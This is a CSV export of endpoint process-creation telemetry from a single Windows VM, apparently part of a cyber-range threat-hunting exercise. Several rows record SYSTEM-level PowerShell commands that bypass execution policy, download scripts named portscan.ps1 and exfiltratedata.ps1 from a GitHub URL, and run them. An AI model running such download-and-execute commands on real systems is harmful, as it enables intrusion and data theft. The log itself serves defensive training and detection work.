Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,ProcessVersionInfoCompanyName,ProcessVersionInfoProductName,ProcessVersionInfoProductVersion,ProcessVersionInfoInternalFileName,ProcessVersionInfoOriginalFileName,ProcessVersionInfoFileDescription,ProcessId,ProcessCommandLine,ProcessIntegrityLevel,ProcessTokenElevation,ProcessCreationTime,AccountDomain,AccountName,AccountSid,AccountUpn,AccountObjectId,LogonId,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessAccountUpn,InitiatingProcessAccountObjectId,InitiatingProcessLogonId,InitiatingProcessIntegrityLevel,InitiatingProcessTokenElevation,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessFolderPath,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessSignerType,InitiatingProcessSignatureStatus,ReportId,AppGuardContainerId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionDeviceName,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,ProcessUniqueId,InitiatingProcessUniqueId
"Jun 15, 2025 2:25:12 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,2260,powershell  -ExecutionPolicy Unrestricted -File script1.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:25:12 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,1860,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script1.ps1","Jun 15, 2025 2:25:12 PM",c:\windows\system32\cmd.exe,5536,RunCommandExtension.exe,"Jun 15, 2025 2:25:11 PM",OsVendor,Valid,5709,,,0,0,,,0,0,,,1970324836975172,1970324836975169
"Jun 15, 2025 2:25:13 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3036,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:25:13 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3316,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1","Jun 15, 2025 2:25:12 PM",c:\windows\system32\cmd.exe,2260,powershell.exe,"Jun 15, 2025 2:25:12 PM",OsVendor,Valid,5711,,,0,0,,,0,0,,,1970324836975174,1970324836975173
"Jun 15, 2025 2:25:17 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6860,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:25:17 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,4880,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\eicar.ps1","Jun 15, 2025 2:25:17 PM",c:\windows\system32\cmd.exe,2260,powershell.exe,"Jun 15, 2025 2:25:12 PM",OsVendor,Valid,5728,,,0,0,,,0,0,,,1970324836975176,1970324836975175
"Jun 15, 2025 2:37:15 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3504,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 15, 2025 2:37:15 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,960,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 15, 2025 2:37:14 PM",c:\windows\system32\cmd.exe,2156,WindowsAzureGuestAgent.exe,"Jun 15, 2025 1:28:46 PM",OsVendor,Valid,6246,,,0,0,,,0,0,,,1970324836975227,1970324836975224
"Jun 15, 2025 2:37:16 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3188,powershell  -ExecutionPolicy Unrestricted -File script2.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:37:16 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,4392,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script2.ps1","Jun 15, 2025 2:37:16 PM",c:\windows\system32\cmd.exe,7508,RunCommandExtension.exe,"Jun 15, 2025 2:37:15 PM",OsVendor,Valid,6253,,,0,0,,,0,0,,,1970324836975234,1970324836975232
"Jun 15, 2025 2:37:17 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,636,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:37:17 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3824,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1","Jun 15, 2025 2:37:17 PM",c:\windows\system32\cmd.exe,3188,powershell.exe,"Jun 15, 2025 2:37:16 PM",OsVendor,Valid,6255,,,0,0,,,0,0,,,1970324836975236,1970324836975235
"Jun 15, 2025 2:37:20 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,1112,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:37:20 PM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,5496,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1","Jun 15, 2025 2:37:20 PM",c:\windows\system32\cmd.exe,3188,powershell.exe,"Jun 15, 2025 2:37:16 PM",OsVendor,Valid,6290,,,0,0,,,0,0,,,1970324836975239,1970324836975238
"Jun 15, 2025 2:49:19 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7960,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 15, 2025 2:49:19 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,6040,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 15, 2025 2:49:18 PM",c:\windows\system32\cmd.exe,2156,WindowsAzureGuestAgent.exe,"Jun 15, 2025 1:28:46 PM",OsVendor,Valid,6730,,,0,0,,,0,0,,,1970324836975269,1970324836975261
"Jun 15, 2025 2:49:19 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,2336,powershell  -ExecutionPolicy Unrestricted -File script3.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:49:19 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,1972,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script3.ps1","Jun 15, 2025 2:49:19 PM",c:\windows\system32\cmd.exe,5312,RunCommandExtension.exe,"Jun 15, 2025 2:49:18 PM",OsVendor,Valid,6731,,,0,0,,,0,0,,,1970324836975270,1970324836975267
"Jun 15, 2025 2:49:20 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6168,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:49:20 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3372,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1","Jun 15, 2025 2:49:20 PM",c:\windows\system32\cmd.exe,2336,powershell.exe,"Jun 15, 2025 2:49:19 PM",OsVendor,Valid,6733,,,0,0,,,0,0,,,1970324836975272,1970324836975271
"Jun 15, 2025 2:49:24 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4064,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:49:24 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3848,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\exfiltratedata.ps1","Jun 15, 2025 2:49:24 PM",c:\windows\system32\cmd.exe,2336,powershell.exe,"Jun 15, 2025 2:49:19 PM",OsVendor,Valid,6751,,,0,0,,,0,0,,,1970324836975274,1970324836975273
"Jun 15, 2025 3:02:25 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7940,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 15, 2025 3:02:25 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,2188,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 15, 2025 3:02:24 PM",c:\windows\system32\cmd.exe,2156,WindowsAzureGuestAgent.exe,"Jun 15, 2025 1:28:46 PM",OsVendor,Valid,7106,,,0,0,,,0,0,,,1970324836975300,1970324836975298
"Jun 15, 2025 3:43:26 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3356,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq 'a82c6e6a6ea7e12ad7b6f4d282fb14e9d9aa670967295438b00498fd214d65e3')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\0e3d6d2d-06cc-486d-9465-9ef3bee75444.ps1' }""",System,TokenElevationTypeDefault,"Jun 15, 2025 3:43:26 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,5772,"""SenseIR.exe"" ""OfflineSenseIR"" ""3912"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MjU2NH0=""","Jun 15, 2025 3:43:16 PM",c:\program files\windows defender advanced threat protection\senseir.exe,6008,MsSense.exe,"Jun 15, 2025 1:38:27 PM",OsVendor,Valid,8047,,,0,0,,,0,0,,,1970324836975443,1970324836975442
"Jun 15, 2025 3:53:26 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6080,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '45f85dba018d9c516d006f6765b6c3bd9aedcf5fb8f0c5f587384683e9d26a25')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\7b060674-6027-411f-86aa-13a75308bdb2.ps1' }""",System,TokenElevationTypeDefault,"Jun 15, 2025 3:53:26 PM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,5772,"""SenseIR.exe"" ""OfflineSenseIR"" ""3912"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MjU2NH0=""","Jun 15, 2025 3:43:16 PM",c:\program files\windows defender advanced threat protection\senseir.exe,6008,MsSense.exe,"Jun 15, 2025 1:38:27 PM",OsVendor,Valid,8146,,,0,0,,,0,0,,,1970324836975468,1970324836975442
